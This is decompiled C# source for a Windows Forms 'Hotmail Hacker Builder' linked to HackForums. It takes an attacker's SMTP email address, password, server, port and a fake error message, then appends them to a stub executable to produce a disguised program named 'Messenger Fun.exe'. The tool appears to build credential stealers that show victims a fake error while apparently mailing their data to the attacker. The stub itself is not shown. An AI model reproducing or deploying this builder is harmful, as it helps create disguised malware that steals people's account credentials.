using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Hotmail_Hacker_Builder.My;
using Hotmail_Hacker_Builder.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Hotmail_Hacker_Builder;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("GroupBox1")]
	private GroupBox _GroupBox1;

	[AccessedThroughProperty("Label5")]
	private Label _Label5;

	[AccessedThroughProperty("NumericUpDown1")]
	private NumericUpDown _NumericUpDown1;

	[AccessedThroughProperty("Label4")]
	private Label _Label4;

	[AccessedThroughProperty("Label3")]
	private Label _Label3;

	[AccessedThroughProperty("TextBox5")]
	private TextBox _TextBox5;

	[AccessedThroughProperty("TextBox3")]
	private TextBox _TextBox3;

	[AccessedThroughProperty("TextBox2")]
	private TextBox _TextBox2;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("CheckBox1")]
	private CheckBox _CheckBox1;

	[AccessedThroughProperty("TextBox4")]
	private TextBox _TextBox4;

	[AccessedThroughProperty("Label6")]
	private Label _Label6;

	[AccessedThroughProperty("LinkLabel1")]
	private LinkLabel _LinkLabel1;

	[AccessedThroughProperty("Label7")]
	private Label _Label7;

	private string stub;

	private string t1;

	private string t2;

	private string t3;

	private string t4;

	private string t5;

	private bool cb1;

	private int port;

	private string errormsg;

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_PictureBox1 = value;
		}
	}

	internal virtual Button Button1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual Button Button2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Button2_Click;
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click(eventHandler);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click(eventHandler);
			}
		}
	}

	internal virtual GroupBox GroupBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox1 = value;
		}
	}

	internal virtual Label Label5
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label5 = value;
		}
	}

	internal virtual NumericUpDown NumericUpDown1
	{
		[DebuggerNonUserCode]
		get
		{
			return _NumericUpDown1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_NumericUpDown1 = value;
		}
	}

	internal virtual Label Label4
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label4 = value;
		}
	}

	internal virtual Label Label3
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label3 = value;
		}
	}

	internal virtual TextBox TextBox5
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox5 = value;
		}
	}

	internal virtual TextBox TextBox3
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox3 = value;
		}
	}

	internal virtual TextBox TextBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox2 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual CheckBox CheckBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _CheckBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_CheckBox1 = value;
		}
	}

	internal virtual TextBox TextBox4
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox4 = value;
		}
	}

	internal virtual Label Label6
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label6 = value;
		}
	}

	internal virtual LinkLabel LinkLabel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0008: Unknown result type (might be due to invalid IL or missing references)
			//IL_000e: Expected O, but got Unknown
			LinkLabelLinkClickedEventHandler val = new LinkLabelLinkClickedEventHandler(LinkLabel1_LinkClicked);
			if (_LinkLabel1 != null)
			{
				_LinkLabel1.remove_LinkClicked(val);
			}
			_LinkLabel1 = value;
			if (_LinkLabel1 != null)
			{
				_LinkLabel1.add_LinkClicked(val);
			}
		}
	}

	internal virtual Label Label7
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label7 = value;
		}
	}

	public Form1()
	{
		lock (__ENCList)
		{
			__ENCList.Add(new WeakReference(this));
		}
		errormsg = "You must complete all fields!";
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_008a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0094: Expected O, but got Unknown
		//IL_0095: Unknown result type (might be due to invalid IL or missing references)
		//IL_009f: Expected O, but got Unknown
		//IL_00a0: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Expected O, but got Unknown
		//IL_00ab: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b5: Expected O, but got Unknown
		//IL_00b6: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c0: Expected O, but got Unknown
		//IL_00c1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00cb: Expected O, but got Unknown
		//IL_00cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_00d6: Expected O, but got Unknown
		//IL_00d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e1: Expected O, but got Unknown
		//IL_0879: Unknown result type (might be due to invalid IL or missing references)
		//IL_0883: Expected O, but got Unknown
		//IL_0b2a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b34: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		PictureBox1 = new PictureBox();
		Button1 = new Button();
		Button2 = new Button();
		GroupBox1 = new GroupBox();
		Label7 = new Label();
		TextBox4 = new TextBox();
		Label6 = new Label();
		CheckBox1 = new CheckBox();
		Label5 = new Label();
		NumericUpDown1 = new NumericUpDown();
		Label4 = new Label();
		Label3 = new Label();
		TextBox5 = new TextBox();
		TextBox3 = new TextBox();
		TextBox2 = new TextBox();
		TextBox1 = new TextBox();
		Label2 = new Label();
		Label1 = new Label();
		LinkLabel1 = new LinkLabel();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)GroupBox1).SuspendLayout();
		((ISupportInitialize)NumericUpDown1).BeginInit();
		((Control)this).SuspendLayout();
		((Control)PictureBox1).set_BackgroundImageLayout((ImageLayout)3);
		PictureBox1.set_Image((Image)(object)Resources.ScreenHunter_07_May__25_16_58);
		PictureBox pictureBox = PictureBox1;
		Point location = new Point(248, 12);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		Size size = new Size(219, 346);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_SizeMode((PictureBoxSizeMode)1);
		PictureBox1.set_TabIndex(0);
		PictureBox1.set_TabStop(false);
		Button button = Button1;
		location = new Point(12, 335);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(75, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(8);
		((ButtonBase)Button1).set_Text("Build");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Button button3 = Button2;
		location = new Point(167, 335);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(75, 23);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(10);
		((ButtonBase)Button2).set_Text("Exit");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		((Control)GroupBox1).set_BackColor(Color.Transparent);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label7);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox4);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label6);
		((Control)GroupBox1).get_Controls().Add((Control)(object)CheckBox1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label5);
		((Control)GroupBox1).get_Controls().Add((Control)(object)NumericUpDown1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label4);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label3);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox5);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox3);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)TextBox1);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label2);
		((Control)GroupBox1).get_Controls().Add((Control)(object)Label1);
		GroupBox groupBox = GroupBox1;
		location = new Point(12, 12);
		((Control)groupBox).set_Location(location);
		((Control)GroupBox1).set_Name("GroupBox1");
		GroupBox groupBox2 = GroupBox1;
		size = new Size(230, 304);
		((Control)groupBox2).set_Size(size);
		((Control)GroupBox1).set_TabIndex(3);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("Settings:");
		Label7.set_AutoSize(true);
		Label label = Label7;
		location = new Point(131, 182);
		((Control)label).set_Location(location);
		((Control)Label7).set_Name("Label7");
		Label label2 = Label7;
		size = new Size(99, 26);
		((Control)label2).set_Size(size);
		((Control)Label7).set_TabIndex(5);
		Label7.set_Text("Default Information \r\nIs For Gmail");
		TextBox textBox = TextBox4;
		location = new Point(6, 268);
		((Control)textBox).set_Location(location);
		((Control)TextBox4).set_Name("TextBox4");
		TextBox textBox2 = TextBox4;
		size = new Size(218, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox4).set_TabIndex(7);
		TextBox4.set_Text("There was an error! Please check your settings and try again.");
		Label6.set_AutoSize(true);
		Label label3 = Label6;
		location = new Point(3, 252);
		((Control)label3).set_Location(location);
		((Control)Label6).set_Name("Label6");
		Label label4 = Label6;
		size = new Size(131, 13);
		((Control)label4).set_Size(size);
		((Control)Label6).set_TabIndex(12);
		Label6.set_Text("Error Message To Display:");
		((ButtonBase)CheckBox1).set_AutoSize(true);
		CheckBox1.set_Checked(true);
		CheckBox1.set_CheckState((CheckState)1);
		CheckBox checkBox = CheckBox1;
		location = new Point(6, 215);
		((Control)checkBox).set_Location(location);
		((Control)CheckBox1).set_Name("CheckBox1");
		CheckBox checkBox2 = CheckBox1;
		size = new Size(125, 17);
		((Control)checkBox2).set_Size(size);
		((Control)CheckBox1).set_TabIndex(6);
		((ButtonBase)CheckBox1).set_Text("Server Requires SSL");
		((ButtonBase)CheckBox1).set_UseVisualStyleBackColor(true);
		Label5.set_AutoSize(true);
		Label label5 = Label5;
		location = new Point(6, 94);
		((Control)label5).set_Location(location);
		((Control)Label5).set_Name("Label5");
		Label label6 = Label5;
		size = new Size(46, 13);
		((Control)label6).set_Size(size);
		((Control)Label5).set_TabIndex(10);
		Label5.set_Text("Subject:");
		NumericUpDown numericUpDown = NumericUpDown1;
		location = new Point(45, 188);
		((Control)numericUpDown).set_Location(location);
		NumericUpDown numericUpDown2 = NumericUpDown1;
		decimal num = new decimal(new int[4] { 9999, 0, 0, 0 });
		numericUpDown2.set_Maximum(num);
		((Control)NumericUpDown1).set_Name("NumericUpDown1");
		NumericUpDown numericUpDown3 = NumericUpDown1;
		size = new Size(54, 20);
		((Control)numericUpDown3).set_Size(size);
		((Control)NumericUpDown1).set_TabIndex(5);
		NumericUpDown numericUpDown4 = NumericUpDown1;
		num = new decimal(new int[4] { 587, 0, 0, 0 });
		numericUpDown4.set_Value(num);
		Label4.set_AutoSize(true);
		Label label7 = Label4;
		location = new Point(3, 172);
		((Control)label7).set_Location(location);
		((Control)Label4).set_Name("Label4");
		Label label8 = Label4;
		size = new Size(96, 13);
		((Control)label8).set_Size(size);
		((Control)Label4).set_TabIndex(8);
		Label4.set_Text("SMTP Server Port:");
		Label3.set_AutoSize(true);
		Label label9 = Label3;
		location = new Point(3, 133);
		((Control)label9).set_Location(location);
		((Control)Label3).set_Name("Label3");
		Label label10 = Label3;
		size = new Size(115, 13);
		((Control)label10).set_Size(size);
		((Control)Label3).set_TabIndex(7);
		Label3.set_Text("SMTP Server Address:");
		TextBox textBox3 = TextBox5;
		location = new Point(6, 110);
		((Control)textBox3).set_Location(location);
		((Control)TextBox5).set_Name("TextBox5");
		TextBox textBox4 = TextBox5;
		size = new Size(218, 20);
		((Control)textBox4).set_Size(size);
		((Control)TextBox5).set_TabIndex(3);
		TextBox textBox5 = TextBox3;
		location = new Point(6, 149);
		((Control)textBox5).set_Location(location);
		((Control)TextBox3).set_Name("TextBox3");
		TextBox textBox6 = TextBox3;
		size = new Size(133, 20);
		((Control)textBox6).set_Size(size);
		((Control)TextBox3).set_TabIndex(4);
		TextBox3.set_Text("smtp.gmail.com");
		((Control)TextBox2).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		TextBox textBox7 = TextBox2;
		location = new Point(6, 71);
		((Control)textBox7).set_Location(location);
		((Control)TextBox2).set_Name("TextBox2");
		TextBox2.set_PasswordChar('X');
		TextBox textBox8 = TextBox2;
		size = new Size(218, 20);
		((Control)textBox8).set_Size(size);
		((Control)TextBox2).set_TabIndex(2);
		TextBox textBox9 = TextBox1;
		location = new Point(6, 32);
		((Control)textBox9).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox10 = TextBox1;
		size = new Size(218, 20);
		((Control)textBox10).set_Size(size);
		((Control)TextBox1).set_TabIndex(1);
		Label2.set_AutoSize(true);
		Label label11 = Label2;
		location = new Point(6, 55);
		((Control)label11).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label12 = Label2;
		size = new Size(88, 13);
		((Control)label12).set_Size(size);
		((Control)Label2).set_TabIndex(1);
		Label2.set_Text("E-Mail Password:");
		Label1.set_AutoSize(true);
		Label label13 = Label1;
		location = new Point(6, 16);
		((Control)label13).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label14 = Label1;
		size = new Size(80, 13);
		((Control)label14).set_Size(size);
		((Control)Label1).set_TabIndex(0);
		Label1.set_Text("E-Mail Address:");
		((Label)LinkLabel1).set_AutoSize(true);
		((Control)LinkLabel1).set_BackColor(Color.Transparent);
		LinkLabel linkLabel = LinkLabel1;
		location = new Point(87, 319);
		((Control)linkLabel).set_Location(location);
		((Control)LinkLabel1).set_Name("LinkLabel1");
		LinkLabel linkLabel2 = LinkLabel1;
		size = new Size(85, 13);
		((Control)linkLabel2).set_Size(size);
		((Control)LinkLabel1).set_TabIndex(9);
		((Label)LinkLabel1).set_TabStop(true);
		LinkLabel1.set_Text("HackForums.net");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_AutoSizeMode((AutoSizeMode)0);
		((Control)this).set_BackgroundImage((Image)(object)Resources.wave3header);
		((Control)this).set_BackgroundImageLayout((ImageLayout)3);
		size = new Size(479, 370);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel1);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Text("Messenger Fun Builder");
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)GroupBox1).ResumeLayout(false);
		((Control)GroupBox1).PerformLayout();
		((ISupportInitialize)NumericUpDown1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0051: Unknown result type (might be due to invalid IL or missing references)
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ad: Unknown result type (might be due to invalid IL or missing references)
		//IL_00db: Unknown result type (might be due to invalid IL or missing references)
		//IL_02c1: Unknown result type (might be due to invalid IL or missing references)
		if (Operators.CompareString(TextBox1.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)errormsg, (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(TextBox2.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)errormsg, (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(TextBox3.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)errormsg, (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(TextBox4.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)errormsg, (MsgBoxStyle)0, (object)null);
			return;
		}
		if (Operators.CompareString(TextBox5.get_Text(), "", false) == 0)
		{
			Interaction.MsgBox((object)errormsg, (MsgBoxStyle)0, (object)null);
			return;
		}
		port = Convert.ToInt32(NumericUpDown1.get_Value());
		if (CheckBox1.get_Checked())
		{
			cb1 = true;
		}
		else
		{
			cb1 = false;
		}
		t1 = TextBox1.get_Text();
		t2 = TextBox2.get_Text();
		t3 = TextBox5.get_Text();
		t4 = TextBox3.get_Text();
		t5 = TextBox4.get_Text();
		FileSystem.FileOpen(1, Application.get_StartupPath() + "\\MMStub.exe", (OpenMode)32, (OpenAccess)1, (OpenShare)(-1), -1);
		stub = Strings.Space(checked((int)FileSystem.LOF(1)));
		FileSystem.FileGet(1, ref stub, -1L, false);
		FileSystem.FileClose(new int[1] { 1 });
		if (File.Exists("Messenger Fun.exe"))
		{
			((ServerComputer)MyProject.Computer).get_FileSystem().DeleteFile("Messenger Fun.exe");
		}
		FileSystem.FileOpen(1, Application.get_StartupPath() + "\\Messenger Fun.exe", (OpenMode)32, (OpenAccess)3, (OpenShare)(-1), -1);
		FileSystem.FilePut(1, stub + "@!HoHa!@" + t1 + "@!HoHa!@" + t2 + "@!HoHa!@" + t3 + "@!HoHa!@" + t4 + "@!HoHa!@" + t5 + "@!HoHa!@" + Conversions.ToString(cb1) + "@!HoHa!@" + Conversions.ToString(port), -1L, false);
		FileSystem.FileClose(new int[1] { 1 });
		Interaction.MsgBox((object)"Messenger Fun.exe created !\r\nHave fun!", (MsgBoxStyle)0, (object)null);
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		((Form)this).Close();
	}

	private void LinkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
	{
		Process.Start("http://www.hackforums.net");
	}
}
